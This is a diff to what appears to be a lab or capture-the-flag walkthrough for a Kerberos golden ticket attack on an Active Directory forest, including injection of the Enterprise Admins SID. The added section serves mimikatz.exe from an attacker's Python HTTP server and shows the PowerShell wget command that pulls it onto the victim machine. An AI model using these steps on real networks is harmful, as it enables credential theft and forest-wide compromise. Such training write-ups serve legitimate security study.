@@ -7,6 +7,14 @@ To carry out this attack you will need:
 - The user account we want to impersonate (Administrator).
 - Dump SID of **“Enterprise Admin”** of root.thereserve.loc.
 	To make your attack more advanced, you can also inject the SID for the `Enterprise Admins` group so that the user you impersonate would have high privileges. This will give you access to all the machines in the entire Forest if we are successful in doing so.
+
+## Get mimikatz from the attacking machine
+
+- On the attacking machine open a python http server in the directory where mimikatz.exe is.
+	$ `sudo python3 -m http.server`
+
+- On the victim machine run powershell and then the following code.
+	PS C:\Users\Administrator> `wget http://10.50.110.16:8000/mimikatz.exe -o mimikatz.exe`
 ## Dump the krbtgt Hash
 
 
